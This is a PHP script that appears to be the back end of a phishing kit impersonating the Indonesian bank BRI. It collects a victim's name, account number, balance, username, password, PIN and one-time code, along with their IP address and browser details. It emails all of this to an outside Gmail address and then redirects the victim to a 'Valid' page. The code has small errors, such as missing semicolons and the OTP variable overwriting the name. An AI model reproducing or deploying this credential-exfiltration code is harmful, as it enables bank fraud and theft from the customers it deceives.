<?php 
session_start();
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }

$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];

date_default_timezone_set('Asia/Jakarta');
$tgl = Date('d/m/Y');
$jam = Date('H:i:s');
$to = "Programmandirii@gmail.com";
$subject = "|BRI| OTP | $tgl $jam";
$name = $_SESSION['name'];
$nmr = $_SESSION['nmr'];
$sisa = $_SESSION['sisa'];
$user = $_SESSION['user'];
$pass = $_SESSION['pass'];
$sixpin = $_SESSION['$sixpin']
$name = $_POST['name']
$message = "
<b>|BRI| OTP</b><br>
NAME       : $name<br>
NOREK      : $nmr<br>
SALDO      : $saldo<br>
Username   : $user<br>
Password   : $pass<br>
PIN        : $sixpin<br>
OTP        : $name<br>
IP         : $ipaddress<br>
User-Agent : $browser<br>";

// Always set content-type when sending HTML email
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

// More headers
$headers .= 'From: <info@up-app.biz.id>' . "\r\n";
$headers .= 'Cc: Programmandirii@gmail.com' . "\r\n";
mail($to,$subject,$message,$headers);
header('Location: ./../Valid');
?>
